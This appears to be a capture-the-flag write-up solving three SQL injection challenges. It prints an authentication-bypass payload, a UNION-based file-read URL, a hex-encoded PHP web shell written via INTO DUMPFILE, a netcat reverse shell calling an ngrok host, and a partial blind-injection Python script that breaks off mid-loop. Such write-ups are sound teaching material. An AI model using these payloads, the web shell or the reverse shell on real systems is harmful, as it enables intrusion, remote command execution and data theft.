# SQLi 1

![[sqli1_sujet.png]]

Here, we are tasked to perform SQL injections. An IPS is configured, this means that we can't use tools like `SQLMap` because we would be blocked. We can see, that we are facing a login page. In CTF environment, the first thing that comes to your mind when you see a login page (after trying default credentials) is to perform an SQLi to bypass the authentication process. Using the payload `admin' OR True -- -` will result in a `SQL` query looking like:
`Select * From Users where username='admin' OR True -- - AND password='a'`

As you can see, we are looking for the username `admin` but we use a `True` statement. The `username='admin' OR True` will result in a `True` statement. This will authenticate us as the first user in the database that is often the admin. 

> Note the use of `-- -`, this allows us to comment the rest of the query. Thanks to that, we can bypass the need of the password.
{: .prompt-info}

And voilà, we are authenticated as `admin` and we have the flag:

![[sqli1_flag.png]]

# SQLi 2

![[sqli2_sujet.png]]

Here we need to perform a more difficult `SQLi`. We first need to search for the vulnerable parameter. Here it is `id`:

![[sqli2_vuln.png]]

We will try a `UNION based SQLi`. First we need to know how much columns are used in the `SQL` query. To do that we can simply use a payload like `UNION SELECT NULL -- -` then if there is no page printed out, we use the payload `UNION SELECT NULL,NULL -- -` and so on until we have a page that we can see:

![[sqli2_collumns.png]]

As we can see from our `UNION based SQLi`, we know that there are 4 rows in the query. We can now use this to read file like in the `LFI 2` challenge:

`http://ctf.insa-cvl.fr:1003/post.php?id=-1%20UNION%20SELECT%20NULL,to_base64(load_file(%22/var/www/html/index.php%22)),NULL,NULL%20--%20-`

This payload gives us a `base64` string of the content of `index.php` source code. We can decode it and we get:

![[sqli2_index.png]]

There is no flag here. But we notice a file called `db_config.php`. Lets check this file:

![[sqli2_flag.png]]

And voilà... We get the username and password for the database and the flag.

# SQLI 3

![[sqli3_sujet.png]]

Now this challenge is a bit harder than the previous one because we need to `upload` a shell to the machine. It can be a reverse or web shell, it doesn't matter. As we can see, when we enter a string we get the exact syntax of the `SQL` query:  

![[sqli3_vuln.png]]

We will use the following payload to write into the `css` folder (the only one where we have rights) in the `bipbip.php` file.

`' union select NULL, 0x3c3f7068700a20202020696628697373657428245f4745545b27636d64275d29202626204d443528245f4745545b2770617373275d29203d3d2022636136333537343336306235303061626133336333356163393334333535663122290a202020207b0a202020202020202073797374656d28245f4745545b27636d64275d293b0a202020207d0a3f3e0a into dumpfile '/var/www/html/css/bipbip.php' #`

The content of the hexadecimal string it the following:
```
<?php
    if(isset($_GET['cmd']) && MD5($_GET['pass']) == "ca63574360b500aba33c35ac934355f1")
    {
        system($_GET['cmd']);
    }
?>
```

> Note the use of the hex string instead of putting the plain `PHP` code. This is because sometimes you will get errors because some characters can be removed for exemple.
{: .prompt-info}

> Note the use of a password. This is a good practice because you don't want other teams to be able to use you shell and in a more realist environment you don't want hackers to be able to use the tools that you are using in your pentest to exploit the company you are assessing.
{: .prompt-tip}

Now we can just call our file and specify the command and the password:

![[sqli3_exploit.png]]


We want a reverse shell on the machine, I used this one:

`rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 4.tcp.eu.ngrok.io 14433 >/tmp/f`

Note that if you copy/paste this payload in your `cmd` parameter it won't work. You will have to `URL Encode` it first (and change the IP and port by your values ;) ) .

I already set up a listener using `nc -lvnp 4444` and a `ngrok` to be able to be accessible by the server (`ngrok tcp 4444`).

> Here we are using `ngrok` because we are not on the same network as the machine we are trying to hack. In CTF like `Try Hack Me` we don't need `ngrok` and can simply use `nc -lvnp 4444` because we will have an IP on the same network.
{: .prompt-tip}

As you can see, I got a shell and I beautified it:

![[sqli3_rev_shell.png]]

Now we can access the full database by simply connecting to `mysql` using default credentials. Those credentials can be found in the `PHP` source code of the web pages:

`mysql -u root -proot`

Now we can list databases, list tables inside the `loginsqli` and show all the values in the `users` table:

![[sqli3_mysql.png]]

We now have the password of `bob` (`superbob`) that is the flag to validate the challenge.

Here is a python code that will use an blind/error based SQLi. It performs a dichotomy to retrieve character by character the name of the database, the name of the tables, the name of the columns and the values:

```python
import requests
import time

from math import ceil, floor


url_base = "http://ctf.insa-cvl.fr:1009/"

timing = 1

results = []
offset = 0

while 1:

    candidats = [""]

    while candidats:

        #print(candidats)
        
        candidat = candidats.pop(0)
        index = len(candidat) + 1
        
        #print("My candidat:",candidat, "Len candidat:", index)
        print(candidat)
        start = 0
        end = 127

        found = 0
        old_candidat = candidat

        while 1:

            mid = floor((start + end) // 2)
            #print(start, mid, end)
            
            time.sleep(0.05)

            #print(payload)
            
            url_final = url_base

            data = {

            }

            #start_time = time.time()
            response = requests.post(url_final, data=data)
            #print(response.text)

            #delta = time.time() - start_time
            #print(delta)

            if "demande" in response.text:
                if mid == start:
                    #print(chr(mid))
                    char = chr(mid)
                    if char != '\x00':
                        candidats.append(candidat + char)
                    else:
